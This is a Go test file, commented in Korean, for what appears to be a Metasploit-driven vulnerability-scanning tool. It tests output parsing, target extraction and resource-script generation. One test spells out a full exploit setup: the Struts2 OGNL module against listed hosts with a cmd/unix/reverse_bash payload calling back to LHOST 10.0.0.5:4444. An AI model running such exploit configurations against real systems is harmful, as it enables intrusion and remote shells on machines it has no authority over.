package service

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/rikychoi/recon/internal/model"
)

// TestParseMSFOutput은 msfconsole 출력에서 [+] 결과만 취약점으로 추출하는지 검증한다.
func TestParseMSFOutput(t *testing.T) {
	output := strings.Join([]string{
		"[*] Running module against 10.0.0.1",
		"[+] 10.0.0.1:80 - Vulnerable to CVE-2017-5638",
		"[-] 10.0.0.2:80 - Not vulnerable",
		"[+] 10.0.0.3:8080 - Apache Struts detected",
	}, "\n")

	mod := MSFModule{Name: "exploit/multi/http/struts2_content_type_ognl", CVE: "CVE-2017-5638", CVSS: 10.0}
	vulns := parseMSFOutput(strings.NewReader(output), mod)

	if len(vulns) != 2 {
		t.Fatalf("취약점 개수 = %d, want 2 ([+] 줄만)", len(vulns))
	}
	if vulns[0].Target != "10.0.0.1:80" {
		t.Errorf("대상 추출 오류: got %q, want 10.0.0.1:80", vulns[0].Target)
	}
	if vulns[0].ID != "CVE-2017-5638" || vulns[0].CVSS != 10.0 || vulns[0].Severity != "critical" {
		t.Errorf("취약점 메타데이터 오류: %+v", vulns[0])
	}
	if vulns[0].Source != "metasploit" {
		t.Errorf("source = %q, want metasploit", vulns[0].Source)
	}
}

// TestExtractMSFTarget은 다양한 결과 줄 형태에서 대상 추출을 검증한다.
func TestExtractMSFTarget(t *testing.T) {
	cases := []struct{ in, want string }{
		{"10.0.0.1:80 - Vulnerable", "10.0.0.1:80"},
		{"host.example.com:443 detected", "host.example.com:443"},
		{"", ""},
	}
	for _, c := range cases {
		if got := extractMSFTarget(c.in); got != c.want {
			t.Errorf("extractMSFTarget(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestBuildResourceScript는 생성된 msfconsole 리소스 명령이 모듈·대상·포트·페이로드·LHOST를 포함하는지 검증한다.
func TestBuildResourceScript(t *testing.T) {
	// exploit 모듈 + 포트/페이로드/LHOST/LPORT가 지정되면 모두 설정해야 한다.
	got := buildResourceScript(msfRun{
		mod:    MSFModule{Name: "exploit/multi/http/struts2_content_type_ognl", Payload: "cmd/unix/reverse_bash"},
		rhosts: "1.1.1.1 2.2.2.2",
		rport:  "8080",
		lhost:  "10.0.0.5",
		lport:  4444,
	})
	for _, want := range []string{
		"use exploit/multi/http/struts2_content_type_ognl",
		"set RHOSTS 1.1.1.1 2.2.2.2",
		"set RPORT 8080",
		"set PAYLOAD cmd/unix/reverse_bash",
		"set LHOST 10.0.0.5",
		"set LPORT 4444",
		"run",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("리소스 스크립트에 %q가 없음: %q", want, got)
		}
	}
	// exit는 실행기(oneShotMSF/세션)가 관리하므로 리소스 스크립트에는 포함되지 않아야 한다.
	if strings.Contains(got, "exit") {
		t.Errorf("리소스 스크립트에 exit가 포함되면 안 됨: %q", got)
	}

	// 포트/페이로드/LHOST가 비면 해당 항목을 설정하지 않아야 한다(모듈 기본값 사용).
	noOpt := buildResourceScript(msfRun{mod: MSFModule{Name: "auxiliary/scanner/http/log4shell_scanner"}, rhosts: "1.1.1.1"})
	for _, unwanted := range []string{"RPORT", "PAYLOAD", "LHOST", "LPORT"} {
		if strings.Contains(noOpt, unwanted) {
			t.Errorf("미지정 항목 %q가 스크립트에 포함됨: %q", unwanted, noOpt)
		}
	}
}

// TestMetasploitScanWithFakeBinary는 가짜 msfconsole 바이너리를 주입하여
// Scan의 실행(exec)→파싱 전 구간이 CVE 취약점을 올바로 수집하는지 검증한다(실제 metasploit 불필요).
func TestMetasploitScanWithFakeBinary(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("가짜 셸 스크립트 바이너리는 유닉스 환경에서만 실행한다")
	}

	// 어떤 인자를 받든 취약 판정([+]) 한 줄을 출력하는 가짜 msfconsole.
	dir := t.TempDir()
	fake := filepath.Join(dir, "fake-msfconsole")
	script := "#!/bin/sh\n" +
		"echo '[*] Running module...'\n" +
		"echo '[+] 1.2.3.4:8080 - Vulnerable to CVE-2017-5638 (Apache Struts)'\n"
	if err := os.WriteFile(fake, []byte(script), 0o755); err != nil {
		t.Fatalf("가짜 바이너리 작성 실패: %v", err)
	}

	mod := MSFModule{Name: "exploit/multi/http/struts2_content_type_ognl", CVE: "CVE-2017-5638", CVSS: 9.8, Port: 8080, Service: "http"}
	s := NewMetasploitScanner(fake, mod)

	vulns, err := s.Scan(context.Background(), []model.Port{{Target: "1.2.3.4", Number: 8080, Service: "http"}})
	if err != nil {
		t.Fatalf("Scan 오류: %v", err)
	}
	if len(vulns) != 1 {
		t.Fatalf("취약점 수 = %d, 기대값 1 (%+v)", len(vulns), vulns)
	}
	v := vulns[0]
	if v.ID != "CVE-2017-5638" || v.Source != "metasploit" || v.Target != "1.2.3.4:8080" || v.Severity != "critical" {
		t.Errorf("수집된 취약점 필드 오류: %+v", v)
	}
}
